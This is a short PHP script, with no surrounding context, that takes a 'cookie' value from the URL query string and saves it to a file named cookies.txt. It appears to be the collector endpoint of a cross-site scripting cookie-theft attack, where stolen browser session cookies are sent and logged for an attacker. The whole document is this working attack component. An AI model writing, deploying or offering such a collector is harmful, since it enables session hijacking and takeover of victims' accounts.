<?php 
$cookies=$_GET['cookie'];
$f=fopen("cookies.txt", "w");
fwrite($f, $cookies);
fclose($f);
 ?>
